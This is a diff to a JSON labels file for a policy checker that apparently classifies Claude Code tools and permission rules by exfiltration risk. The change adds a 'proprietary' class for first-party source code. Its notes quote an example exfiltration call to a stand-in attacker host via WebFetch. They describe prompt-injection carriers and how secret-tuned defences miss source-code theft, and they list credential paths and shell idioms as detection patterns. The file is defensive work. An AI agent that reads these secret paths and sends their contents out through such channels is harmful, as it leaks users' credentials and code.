@@ -1,20 +1,21 @@
 {
-  "//": "The labeler — the human-authored map from a Claude Code tool (or permission rule) to abstract effect classes. This file is DATA, not code, so it is inspectable and overridable (--labels <file>). It is a NAMED TRUST OBLIGATION, not a proved thing: polycheck proves the POLICY over these labels; it does not prove the labels are right. A mislabeled tool is a hole the proof cannot see. Effects are the taint universe {untrusted, sensitive, egress}; add your own and reference them in regions.",
+  "//": "The labeler — the human-authored map from a Claude Code tool (or permission rule) to abstract effect classes. This file is DATA, not code, so it is inspectable and overridable (--labels <file>). It is a NAMED TRUST OBLIGATION, not a proved thing: polycheck proves the POLICY over these labels; it does not prove the labels are right. A mislabeled tool is a hole the proof cannot see. Effects are the taint universe {untrusted, sensitive, egress, proprietary}; add your own and reference them in regions.",
   "version": "0.1.0",
   "effects": {
     "untrusted": "the session now holds content of external / attacker-influenceable provenance (prompt-injection carrier)",
     "sensitive": "the session has read secret material — credentials, keys, tokens, private data",
-    "egress": "the session holds an outbound channel capable of carrying bytes off the machine"
+    "egress": "the session holds an outbound channel capable of carrying bytes off the machine",
+    "proprietary": "the session has read first-party source code. NOT a secret — a different asset. Its loss is IP disclosure, not credential theft, and the credential-shaped defenses (a model primed to refuse '.env exfiltration', a classifier tuned for secret patterns) largely miss it because nothing looks like a secret."
   },
   "tools": {
     "WebFetch": { "effects": ["untrusted", "egress"], "note": "BOTH ingest and egress. It pulls attacker-controlled content INTO context AND can carry data OUT in the URL/query — WebFetch('https://attacker.example/?k=' + secret) is the classic, in-the-wild exfiltration channel (Check Point: token exfiltration via Claude Code). Labeling it ingest-only was a real bug: it left an ungated egress path whenever only Bash(curl) was gated." },
     "WebSearch": { "effects": ["untrusted"], "note": "returns external content into the context. A search QUERY is technically a low-bandwidth egress channel (searching for a secret string sends it to the provider); left as ingest-only here to avoid over-flagging, but noted rather than hidden." },
-    "Read": { "effects": [], "sensitiveWhenPathMatches": true, "note": "benign unless it can reach a secret path — see sensitivePaths; an unrestricted Read is treated as sensitive-capable" },
+    "Read": { "effects": [], "sensitiveWhenPathMatches": true, "proprietaryWhenPathMatches": true, "note": "benign unless it can reach a secret path (→ sensitive; see sensitivePaths) or first-party source (→ proprietary; see proprietaryPaths). An unrestricted Read is both." },
     "Edit": { "effects": [], "note": "local mutation; out of scope for the exfiltration regions (a tampering region would cover it — v1 does not model integrity)" },
     "Write": { "effects": [], "note": "as Edit" },
     "NotebookEdit": { "effects": [], "note": "as Edit" },
     "Glob": { "effects": [], "note": "path enumeration; discloses names, not contents" },
-    "Grep": { "effects": [], "sensitiveWhenPathMatches": true, "note": "can read secret file contents if pointed at them; treated like Read for the sensitive class" },
+    "Grep": { "effects": [], "sensitiveWhenPathMatches": true, "proprietaryWhenPathMatches": true, "note": "can read secret file contents (sensitive) or first-party source (proprietary) if pointed at them; treated like Read for both classes" },
     "Bash": { "classify": "bash", "worstCaseWhenUnrestricted": ["untrusted", "sensitive", "egress"], "note": "effect depends on the command string; see bashPatterns. An unrestricted Bash (no specifier, '*', or ':*') is gated on DECLARED WORST-CASE — it alone can complete the trifecta." },
     "Task": { "effects": [], "delegates": true, "note": "spawns a subagent — a delegation edge. v1 does NOT propagate taint across the spawn (a known gap in v1). Reported loudly, not silently cleared." },
     "PowerShell": { "classify": "bash", "worstCaseWhenUnrestricted": ["untrusted", "sensitive", "egress"], "note": "a general-purpose shell like Bash: an unrestricted grant runs arbitrary code (shell-equivalent), and specific commands are matched by the bash pattern lists — which include PowerShell idioms (Invoke-WebRequest/iwr, Invoke-RestMethod/irm, Get-Credential, iex, Start-Process)." },
@@ -79,5 +80,16 @@
     "**/id_rsa", "**/id_rsa.*", "**/id_ed25519", "**/.ssh/**", "**/.aws/**", "**/.netrc",
     "**/.git-credentials", "**/secrets/**", "**/secret*", "**/*secret*", "**/*token*",
     "**/.npmrc", "**/.pypirc", "**/.kube/config", "**/service-account*.json"
+  ],
+  "//proprietaryPaths": "First-party SOURCE — the asset behind the 'proprietary' effect and the 'source-egress' region. A Read whose glob covers any of these can carry code off the machine. Deliberately broad: source is not one file, and 'read the repo, post it out' is the whole point. Override with --labels if your repo is public (then code egress is not a loss).",
+  "proprietaryExemplars": [
+    "src/index.js", "src/index.mjs", "src/main.py", "lib/core.mjs", "app/main.py",
+    "index.ts", "main.go", "pkg/handler.rs", "server.js", "components/App.tsx"
+  ],
+  "proprietaryPaths": [
+    "**/*.mjs", "**/*.cjs", "**/*.js", "**/*.jsx", "**/*.ts", "**/*.tsx",
+    "**/*.py", "**/*.rb", "**/*.go", "**/*.rs", "**/*.java", "**/*.kt",
+    "**/*.c", "**/*.cc", "**/*.cpp", "**/*.h", "**/*.hpp", "**/*.cs", "**/*.php", "**/*.swift",
+    "**/src/**", "**/lib/**", "**/app/**", "**/pkg/**", "**/internal/**"
   ]
 }
